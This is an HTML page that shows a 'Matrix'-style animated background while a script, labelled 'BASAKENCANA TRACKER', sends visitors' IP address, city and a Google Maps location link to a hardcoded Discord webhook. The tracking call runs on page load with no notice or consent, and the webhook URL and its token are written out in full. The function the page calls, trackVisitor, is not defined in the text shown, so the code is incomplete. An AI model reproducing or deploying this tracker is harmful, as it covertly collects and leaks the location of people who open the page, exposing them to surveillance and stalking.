    <style>
        body { margin: 0; background: black; color: #0F0; font-family: monospace; overflow: hidden; }
        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        #info { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid #0F0; border-radius: 8px; width: 300px; z-index: 10; }
        #map { height: 200px; width: 100%; margin-top: 15px; border: 1px solid #0F0; border-radius: 4px; }
    </style>

<body>

<div id="info">

</div>

<canvas id="matrix"></canvas>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>
// 1. CONFIG
const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8dj5XnVckc7du-HRYBFKAvdcxZ9jXcZqjJ_5G4hWa1rX0GUPVQ02P5as6o1Ok0xR";

// 2. MATRIX BACKGROUND
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0F0";
    ctx.font = fontSize + "px monospace";
    drops.forEach((y, i) => {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, y * fontSize);
        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    });
}
async function sendToDiscord(data, mapsLink, metode) {
    const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8dj5XnVckc7du-HRYBFKAvdcxZ9jXcZqjJ_5G4hWa1rX0GUPVQ02P5as6o1Ok0xR";
    
    const payload = {
        username: "BASAKENCANA TRACKER",
        content: `📍 **LOKASI DITEMUKAN!**\nMetode: ${metode}\nLink: ${mapsLink}`,
        embeds: [{
            title: "🚀 Detail Pengunjung",
            color: 5763719, // Warna Hijau
            fields: [
                { name: "🌐 IP Address", value: data.ip, inline: true },
                { name: "🏙️ Kota", value: data.city, inline: true },
                { name: "🗺️ Google Maps", value: `[Klik di Sini](${mapsLink})` }
            ],
            footer: { text: "Basakencana System v1.0" },
            timestamp: new Date()
        }]
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            console.error("Discord API Error:", response.statusText);
        } else {
            console.log("Berhasil terkirim ke Discord!");
        }
    } catch (e) {
        console.error("Gagal koneksi ke Discord:", e);
    }
}setInterval(drawMatrix, 33);

trackVisitor();
